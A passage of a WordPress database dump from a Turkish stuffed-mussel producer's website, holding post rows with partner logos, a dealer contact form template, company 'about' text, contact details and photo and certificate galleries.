width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0022_eskiz.png\"><img class=\"alignnone size-full wp-image-976\" alt=\"logo_0022_eskiz\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0022_eskiz.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0023_toskar.png\"><img class=\"alignnone size-full wp-image-977\" alt=\"logo_0023_toskar\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0023_toskar.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/md_prekast.png\"><img class=\"alignnone size-full wp-image-978\" alt=\"md_prekast\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/md_prekast.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/okcam_mobilya.png\"><img class=\"alignnone size-full wp-image-979\" alt=\"okcam_mobilya\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/okcam_mobilya.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/Pimapen-011.png\"><img class=\"alignnone size-full wp-image-980\" alt=\"Pimapen-011\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/Pimapen-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/seldur_elektrik.png\"><img class=\"alignnone size-full wp-image-981\" alt=\"seldur_elektrik\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/seldur_elektrik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/serifoglu-011.png\"><img class=\"alignnone size-full wp-image-982\" alt=\"serifoglu-011\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/serifoglu-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\"><img class=\"alignnone size-full wp-image-983\" alt=\"seyithanoglu_ahsap\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\"><img class=\"alignnone size-full wp-image-984\" alt=\"tepe_insaat_malzemeleri\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/Winsa-011.png\"><img class=\"alignnone size-full wp-image-985\" alt=\"Winsa-011\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/Winsa-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/yuksel_elektrik.png\"><img class=\"alignnone size-full wp-image-986\" alt=\"yuksel_elektrik\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/yuksel_elektrik.png\" width=\"173\" height=\"108\" /></a>","Çözüm Ortakları","","inherit","open","open","","946-revision-v1","","","2014-08-29 23:11:40","2014-08-29 20:11:40","","946","http://www.ismido.com.tr/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("995","1","2014-08-30 00:25:58","2014-08-29 21:25:58","<p>Adınız (gerekli)<br />
    [text* your-name] </p>

<p>Epostanız (gerekli)<br />
    [email* your-email] </p>

<p>Telefon (gerekli)<br />
    [tel* tel-876] </p>

<p>Adres<br />
    [textarea textarea-659]</p>

<p>İletiniz<br />
    [textarea your-message] </p>
<p>[captchac captcha-357 size:m] [captchar captcha-357]</p>

<p>[submit \"Gönder\"]</p>
Bayilik Formu
info@ismido.com.tr
isim: [your-name]

email: [your-email]
telefon: [tel-876]
adres: [textarea-659]
mesaj: [your-message]
info@ismido.com.tr


1










İletiniz başarılı olarak gönderildi. Teşekkürler.
İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.
Onaylama hataları meydana geldi. Lütfen alanları doğrulayın ve tekrar gönderin.
İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.
İlerlemek için lütfen koşulları kabul edin.
Lütfen gerekli alanları doldurun.
Girdiğiniz kod doğru değil.
Sayı biçimi geçersiz görünüyor.
Bu sayı çok küçük.
Bu sayı çok büyük.
Eposta adresi geçersiz görünüyor.
URL geçersiz görünüyor.
Telefon numarası geçersiz görünüyor.
Yanıtınız doğru değil.
Tarih biçimi geçersiz görünüyor.
Bu tarih çok erken.
Bu tarih çok geç.
Dosya gönderme başarısız.
Bu dosya türüne izin verilmiyor.
Bu dosya çok büyük.
Dosya gönderme başarısız. Hata meydana geldi.
The field is too long.
The field is too short.","Bayilik Almak İstiyorum","","publish","open","open","","binami-yeniletmek-istiyorum","","","2016-11-23 01:10:54","2016-11-22 23:10:54","","0","http://www.ismido.com.tr/?post_type=wpcf7_contact_form&#038;p=995","0","wpcf7_contact_form","","0");
INSERT INTO `cmrfu_posts` VALUES("1064","1","2016-11-23 00:03:27","2016-11-22 22:03:27","","mid1","","inherit","open","closed","","mid1","","","2016-11-23 00:03:27","2016-11-22 22:03:27","","0","http://www.ismido.com.tr/wp-content/uploads/2016/11/mid1.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("1065","1","2016-11-23 00:09:29","2016-11-22 22:09:29","","mid2","","inherit","open","closed","","mid2","","","2016-11-23 00:09:29","2016-11-22 22:09:29","","0","http://www.ismido.com.tr/wp-content/uploads/2016/11/mid2.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("1066","1","2016-11-23 00:09:46","2016-11-22 22:09:46","","mid3","","inherit","open","closed","","mid3","","","2016-11-23 00:09:46","2016-11-22 22:09:46","","0","http://www.ismido.com.tr/wp-content/uploads/2016/11/mid3.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("998","1","2014-08-30 00:38:49","2014-08-29 21:38:49","<a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/4.jpg\"><img class=\" wp-image-997 alignright\" alt=\"4\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/4.jpg\" width=\"390\" height=\"551\" /></a>

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","inherit","open","open","","944-autosave-v1","","","2014-08-30 00:38:49","2014-08-29 21:38:49","","944","http://www.ismido.com.tr/944-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("999","1","2014-08-30 00:39:09","2014-08-29 21:39:09","<a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/4.jpg\"><img class=\" wp-image-997 alignright\" alt=\"4\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/4.jpg\" width=\"312\" height=\"441\" /></a>

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","inherit","open","open","","944-revision-v1","","","2014-08-30 00:39:09","2014-08-29 21:39:09","","944","http://www.ismido.com.tr/944-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1000","1","2014-08-30 00:39:37","2014-08-29 21:39:37","<a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/4.jpg\"><img class=\" wp-image-997 alignright\" alt=\"4\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/4.jpg\" width=\"406\" height=\"573\" /></a>

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","inherit","open","open","","944-revision-v1","","","2014-08-30 00:39:37","2014-08-29 21:39:37","","944","http://www.ismido.com.tr/944-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1046","1","2016-11-05 02:09:15","2016-11-05 00:09:15","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Binamı Yeniletmek İstiyorum\"][/heading]
[contact-form-7 id=\"995\" title=\"Binamı Yeniletmek İstiyorum\"]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"https://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","closed","closed","","524-revision-v1","","","2016-11-05 02:09:15","2016-11-05 00:09:15","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1049","1","2016-11-22 23:02:50","2016-11-22 21:02:50","","img051","","inherit","open","closed","","img051","","","2016-11-22 23:02:50","2016-11-22 21:02:50","","0","http://www.ismido.com.tr/wp-content/uploads/2016/11/img051.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1050","1","2016-11-22 23:04:53","2016-11-22 21:04:53","","logo2","","inherit","open","closed","","logo2","","","2016-11-22 23:04:53","2016-11-22 21:04:53","","0","http://www.ismido.com.tr/wp-content/uploads/2016/11/logo2.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("1051","1","2016-11-22 23:07:52","2016-11-22 21:07:52","","logo3","","inherit","open","closed","","logo3","","","2016-11-22 23:07:52","2016-11-22 21:07:52","","0","http://www.ismido.com.tr/wp-content/uploads/2016/11/logo3.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("1052","1","2016-11-22 23:09:48","2016-11-22 21:09:48","<p class=\"style2\" style=\"text-align: left;\" align=\"center\"><strong><span class=\"style22\">ARADIĞINIZ SAĞLIKLI MİDYE</span><em>

</em></strong><span class=\"style6\">İSTANBUL MİDYE DOLMA</span></p>
<p class=\"style14\" style=\"text-align: left;\" align=\"center\"><strong><span class=\"style15\">
</span></strong><span class=\"style16\">Sürekli gelişme ve kendini yenileme felsefesine uygun olarak mükemmellik modelini yakalamak üzere Türkiye\'nin kendi çapında en büyük tesisini kurarak çalışmalarımıza 01 EKİM 2006 tarihinde başladık. Tesisimizde tamamen steril ortamda tüm hassasiyetimizi koruyarak gıda mühendislerinin kontrolörlüğü eşliğinde günlük 30.000 midye dolma hazırlanmaktadır. Bu kapasite en kısa zamanda günlük 75.000 adet olarak hedeflenmektedir. Bu hedefler sadece iç piyasa için olup ihracat çalışmalarımız da devam etmektedir.</span></p>
<p class=\"style13\" style=\"text-align: left;\" align=\"center\">Ürünlerimizi tamamen kendi teknelerimizle ve dalgıçlarımızla Türkiye\'nin nadir bölgelerinden temin etmekteyiz.</p>
<p class=\"style13\" style=\"text-align: left;\" align=\"center\">Tesisimizde işlenen ürünler ilk olarak Tarım ve Köy İşleri Bakanlığının laboratuarlarında tüm analizleri yapılmaktadır.</p>
<p class=\"style13\" style=\"text-align: left;\" align=\"center\">Midye içerisine özenle hazırlanan iç pilav malzemesi konulur ve pişirilir. Midyeler hazır hale geldikten sonra 10\'lu, 15\'li, 25 ve 50\'li paketlerde vakumlanır. İşlenen midyeler günlük ve taze olarak sizlerin damak zevkinize hazır hale getirilmektedir.</p>
<p class=\"style13\" style=\"text-align: left;\" align=\"center\">14-17 Şubat 2007 tarihlerinde Antalya expo center de düzenlenen gıda fuarında Türkiye\'nin saygın firmaları ile tanışma ve iş birliği çalışmalarımızın temelini attık. 31 Ekim - 3 Ekim 2007 tarihleri arasında İstanbul CNR fuar merkezinde 15. Uluslararası gıda ürünleri ve teknolojileri fuarına katıldık.</p>
<p class=\"style8\" style=\"text-align: left;\">ÜRÜNLERİMİZ</p>

<ul>
 	<li class=\"style13\" style=\"text-align: left;\">MİDYE DOLMA</li>
 	<li class=\"style13\" style=\"text-align: left;\">İÇ MİDYE</li>
 	<li class=\"style10\"><span class=\"style12\">KARA MİDYE</span>
<p class=\"style8\" style=\"text-align: left;\"><strong>BELGELERİMİZ</strong></p>

<ul class=\"style1\">
 	<li class=\"style13\" style=\"text-align: left;\">T.C.Tarım ve Köy İşleri Bakanlığı Antalya İl Müdürlüğünün 29.12.2006 tarihli ve G07-1033-G-00001 sayılı izniyle üretilmiştir.</li>
 	<li class=\"style13\" style=\"text-align: left;\">T.C.Antalya Kepez Belediyesi gıda sicil belgesi</li>
 	<li class=\"style13\" style=\"text-align: left;\">İSO 22000 ROYAL CERT belgeli</li>
</ul>
</li>
</ul>","Hakkımızda","","inherit","closed","closed","","944-revision-v1","","","2016-11-22 23:09:48","2016-11-22 21:09:48","","944","http://www.ismido.com.tr/944-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1053","1","2016-11-22 23:11:47","2016-11-22 21:11:47","","gidasicil","","inherit","open","closed","","gidasicil","","","2016-11-22 23:11:47","2016-11-22 21:11:47","","946","http://www.ismido.com.tr/wp-content/uploads/2014/08/gidasicil.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1067","1","2016-11-23 00:47:57","2016-11-22 22:47:57","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C blok  No: 383   Bayrampaşa Istanbul[/list_item]
[list_item icon=\"envelope\"]info@ismido.com.tr[/list_item]
[list_item icon=\"phone-sign\"]+90 212 640 95 62[/list_item]

[list_item icon=\"phone-sign\"]+90 534 738 88 88[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","inherit","closed","closed","","447-revision-v1","","","2016-11-23 00:47:57","2016-11-22 22:47:57","","447","https://www.ismido.com.tr/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1071","1","2017-01-08 21:04:37","2017-01-08 19:04:37","","kayıt belgesi 001","","inherit","open","closed","","kayit-belgesi-001","","","2017-01-08 21:04:37","2017-01-08 19:04:37","","946","https://www.ismido.com.tr/wp-content/uploads/2014/08/kayıt-belgesi-001.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1072","1","2017-01-08 21:04:42","2017-01-08 19:04:42","","MARKA PATENT İSMİDO 001","","inherit","open","closed","","marka-patent-i%cc%87smi%cc%87do-001","","","2017-01-08 21:04:42","2017-01-08 19:04:42","","946","https://www.ismido.com.tr/wp-content/uploads/2014/08/MARKA-PATENT-İSMİDO-001.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1073","1","2017-01-08 21:04:47","2017-01-08 19:04:47","","marka tescili","","inherit","open","closed","","marka-tescili","","","2017-01-08 21:04:47","2017-01-08 19:04:47","","946","https://www.ismido.com.tr/wp-content/uploads/2014/08/marka-tescili.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1074","1","2017-01-08 21:04:50","2017-01-08 19:04:50","","midye tahlil raporu","","inherit","open","closed","","midye-tahlil-raporu","","","2017-01-08 21:04:50","2017-01-08 19:04:50","","946","https://www.ismido.com.tr/wp-content/uploads/2014/08/midye-tahlil-raporu.pdf","0","attachment","application/pdf","0");
INSERT INTO `cmrfu_posts` VALUES("1075","1","2017-01-08 21:04:52","2017-01-08 19:04:52","","Midyenin Faydaları Nelerdir","","inherit","open","closed","","midyenin-faydalari-nelerdir","","","2017-01-08 21:04:52","2017-01-08 19:04:52","","946","https://www.ismido.com.tr/wp-content/uploads/2014/08/Midyenin-Faydaları-Nelerdir.docx","0","attachment","application/vnd.openxmlformats-officedocument.wordprocessingml.document","0");
INSERT INTO `cmrfu_posts` VALUES("1076","1","2017-01-08 21:04:54","2017-01-08 19:04:54","","misya sertifika 001","","inherit","open","closed","","misya-sertifika-001","","","2017-01-08 21:04:54","2017-01-08 19:04:54","","946","https://www.ismido.com.tr/wp-content/uploads/2014/08/misya-sertifika-001.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1077","1","2017-01-08 21:04:58","2017-01-08 19:04:58","","misya sertifika2 001","","inherit","open","closed","","misya-sertifika2-001","","","2017-01-08 21:04:58","2017-01-08 19:04:58","","946","https://www.ismido.com.tr/wp-content/uploads/2014/08/misya-sertifika2-001.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1078","1","2017-01-08 21:05:03","2017-01-08 19:05:03","","onay belgesi 001","","inherit","open","closed","","onay-belgesi-001","","","2017-01-08 21:05:03","2017-01-08 19:05:03","","946","https://www.ismido.com.tr/wp-content/uploads/2014/08/onay-belgesi-001.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1081","1","2017-01-08 21:07:43","2017-01-08 19:07:43","[gallery link=\"file\" size=\"large\" ids=\"1071,1072,1076,1077,1078\"]","Belgeler","","inherit","closed","closed","","946-revision-v1","","","2017-01-08 21:07:43","2017-01-08 19:07:43","","946","https://www.ismido.com.tr/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1082","1","2017-01-08 21:08:28","2017-01-08 19:08:28","[gallery link=\"file\" size=\"medium\" columns=\"4\" ids=\"1071,1072,1076,1077,1078\"]","Belgeler","","inherit","closed","closed","","946-revision-v1","","","2017-01-08 21:08:28","2017-01-08 19:08:28","","946","https://www.ismido.com.tr/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1083","1","2017-01-08 21:10:54","2017-01-08 19:10:54","","logo (2)","","inherit","open","closed","","logo-2","","","2017-01-08 21:16:12","2017-01-08 19:16:12","","0","https://www.ismido.com.tr/wp-content/uploads/2017/01/logo-2.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1086","1","2017-01-23 17:18:24","2017-01-23 15:18:24","","frizLEL","","inherit","open","closed","","frizlel","","","2017-01-23 17:18:24","2017-01-23 15:18:24","","0","http://www.ismido.com.tr/wp-content/uploads/2017/01/frizLEL.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1087","1","2017-01-25 20:53:45","2017-01-25 18:53:45","[gallery link=\"file\" size=\"medium\" ids=\"1088,1089,1090,1091,1092,1093,1095,1096,1097,1098,1099,1100,1101,1102,1104,1105,1107,1109,1111,1112,1114,1115,1117,1118,1121,1122\"]","Üretim","","publish","closed","closed","","uretim","","","2017-01-25 21:26:36","2017-01-25 19:26:36","","0","http://www.ismido.com.tr/?page_id=1087","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("1088","1","2017-01-25 20:42:40","2017-01-25 18:42:40","","5","","inherit","open","closed","","5","","","2017-01-25 20:42:40","2017-01-25 18:42:40","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/5.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1089","1","2017-01-25 20:42:51","2017-01-25 18:42:51","","6","","inherit","open","closed","","6","","","2017-01-25 20:42:51","2017-01-25 18:42:51","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/6.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1090","1","2017-01-25 20:43:05","2017-01-25 18:43:05","","9-001","","inherit","open","closed","","9-001","","","2017-01-25 20:43:05","2017-01-25 18:43:05","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/9-001.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1091","1","2017-01-25 20:43:18","2017-01-25 18:43:18","","10-002","","inherit","open","closed","","10-002","","","2017-01-25 20:43:18","2017-01-25 18:43:18","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/10-002.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1092","1","2017-01-25 20:43:32","2017-01-25 18:43:32","","10","","inherit","open","closed","","10","","","2017-01-25 20:43:32","2017-01-25 18:43:32","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/10.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1093","1","2017-01-25 20:43:49","2017-01-25 18:43:49","","15-001","","inherit","open","closed","","15-001","","","2017-01-25 20:43:49","2017-01-25 18:43:49","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/15-001.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1094","1","2017-01-25 20:52:12","2017-01-25 18:52:12","[gallery link=\"file\" size=\"medium\" ids=\"1103,1106,1108,1110,1113,1116,1120\"]","Standlar","","publish","closed","closed","","standlar","","","2017-01-25 21:25:38","2017-01-25 19:25:38","","0","http://www.ismido.com.tr/?page_id=1094","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("1095","1","2017-01-25 20:44:03","2017-01-25 18:44:03","","26","","inherit","open","closed","","26","","","2017-01-25 20:44:03","2017-01-25 18:44:03","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/26.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1096","1","2017-01-25 20:44:25","2017-01-25 18:44:25","","D3C57213","","inherit","open","closed","","d3c57213","","","2017-01-25 20:44:25","2017-01-25 18:44:25","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57213.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1097","1","2017-01-25 20:45:06","2017-01-25 18:45:06","","D3C57230","","inherit","open","closed","","d3c57230","","","2017-01-25 20:45:06","2017-01-25 18:45:06","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57230.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1098","1","2017-01-25 20:45:52","2017-01-25 18:45:52","","D3C57242","","inherit","open","closed","","d3c57242","","","2017-01-25 20:45:52","2017-01-25 18:45:52","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57242.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1099","1","2017-01-25 20:46:14","2017-01-25 18:46:14","","IMG-20161220-WA0010","","inherit","open","closed","","img-20161220-wa0010","","","2017-01-25 20:46:14","2017-01-25 18:46:14","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0010.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1100","1","2017-01-25 20:46:33","2017-01-25 18:46:33","","IMG-20161220-WA0011","","inherit","open","closed","","img-20161220-wa0011","","","2017-01-25 20:46:33","2017-01-25 18:46:33","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0011.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1101","1","2017-01-25 20:46:54","2017-01-25 18:46:54","","IMG-20161220-WA0012","","inherit","open","closed","","img-20161220-wa0012","","","2017-01-25 20:46:54","2017-01-25 18:46:54","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0012.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1102","1","2017-01-25 20:47:10","2017-01-25 18:47:10","","IMG-20161220-WA0015","","inherit","open","closed","","img-20161220-wa0015","","","2017-01-25 20:47:10","2017-01-25 18:47:10","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0015.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1103","1","2017-01-25 20:47:18","2017-01-25 18:47:18","","DSC01389","","inherit","open","closed","","dsc01389","","","2017-01-25 20:47:18","2017-01-25 18:47:18","","1094","http://www.ismido.com.tr/wp-content/uploads/2017/01/DSC01389.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1104","1","2017-01-25 20:47:31","2017-01-25 18:47:31","","IMG-20161220-WA0017","","inherit","open","closed","","img-20161220-wa0017","","","2017-01-25 20:47:31","2017-01-25 18:47:31","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0017.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1105","1","2017-01-25 20:47:50","2017-01-25 18:47:50","","IMG-20161220-WA0021","","inherit","open","closed","","img-20161220-wa0021","","","2017-01-25 20:47:50","2017-01-25 18:47:50","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0021.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1106","1","2017-01-25 20:47:52","2017-01-25 18:47:52","","DSC01391","","inherit","open","closed","","dsc01391","","","2017-01-25 20:47:52","2017-01-25 18:47:52","","1094","http://www.ismido.com.tr/wp-content/uploads/2017/01/DSC01391.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1107","1","2017-01-25 20:48:09","2017-01-25 18:48:09","","IMG-20161220-WA0022","","inherit","open","closed","","img-20161220-wa0022","","","2017-01-25 20:48:09","2017-01-25 18:48:09","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0022.jpg","0","attachment","image/jpeg","0");
